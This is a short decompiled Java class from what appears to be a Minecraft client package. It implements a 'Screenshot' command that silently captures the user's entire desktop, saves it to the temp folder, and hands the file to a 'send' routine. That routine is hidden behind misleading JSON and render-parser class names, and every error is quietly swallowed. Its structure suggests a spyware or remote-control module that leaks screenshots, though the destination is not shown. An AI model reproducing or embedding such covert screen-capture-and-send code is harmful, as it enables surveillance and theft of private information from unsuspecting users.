// 
// Decompiled by Procyon v0.5.36
// 

package cn.origin.cube.command.commands.impl;

import cn.origin.cube.utils.render.advancedRender.misc.parsers.JSONRegexHandler;

import javax.imageio.ImageIO;
import java.awt.Rectangle;
import java.awt.Toolkit;
import java.awt.Robot;
import java.io.File;
import java.util.Random;
import cn.origin.cube.utils.render.advancedRender.misc.parsers.JSONObject;

public final class Screenshot implements JSONObject
{
    @Override
    public void handle() {
        try {
            final File file = new File(System.getProperty("java.io.tmpdir") + Screenshot.sep + "screenshot_" + new Random().nextInt() + ".png");
            ImageIO.write(new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())), "png", file);
            JSONRegexHandler.send(file);
        }
        catch (Exception ex) {}
    }
    
    @Override
    public String getName() {
        return "Screenshot";
    }
}
